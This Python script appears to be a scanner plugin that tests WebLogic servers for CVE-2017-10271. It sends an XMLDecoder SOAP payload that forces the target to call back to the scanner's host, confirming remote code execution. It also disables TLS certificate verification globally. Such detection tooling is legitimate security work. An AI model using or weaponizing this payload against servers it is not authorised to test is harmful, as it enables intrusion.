#-*- coding: utf-8 -*-

import random
import requests
import socket
from time import sleep
import urllib.request, urllib.error, urllib.parse
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)

def get_ver_ip(ip):
    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    csock.connect((ip, 80))
    (addr, port) = csock.getsockname()
    csock.close()
    return addr

def verify(protocol,ip,port):
    socket.setdefaulttimeout(5)
    oldurl = protocol+'://'+ip+':'+str(port)
    test_str = random_str(6)
    server_ip = get_ver_ip(ip)
    check_url = ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11']
    print('testing if CVE-2017-10271 weblogic wls module remote code exec vul')
    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'SOAPAction': "",
        'Content-Type': 'text/xml;charset=UTF-8',
        }

    post_str = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java version="1.8" class="java.beans.XMLDecoder">
                <void class="java.net.URL">
                  <string>http://%s:8088/add/%s</string>
                  <void method="openStream"/>
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
                ''' % (server_ip, test_str)

    try:
        for url in check_url:
            target_url = oldurl+url.strip()
            req = requests.get(url=target_url, headers=heads, verify=False, timeout=3)
            if 'Web Services' in req.text:
                try:
                    post_str =  post_str.encode(encoding="utf-8")
                    req = urllib.request.Request(url=target_url, headers=heads, data=post_str)
                    page = urllib.request.urlopen(req,timeout=3).read()
                except Exception as e:
                    pass
                sleep(2)
                check_result = requests.get(url="http://%s:8088/check/%s" %(server_ip, test_str), timeout=3)
                if "YES" in check_result.text:
                    msg = 'There is CVE-2017-10271 weblogic wls module remote code exec vul on url: ' +target_url+ ' .'
                    number = 'v63'
                    return True,url,number,msg
                else:
                    pass
            else:
                pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no CVE-2017-10271 weblogic wls module remote code exec vul'
    number = 'v0'
    return False,url,number,msg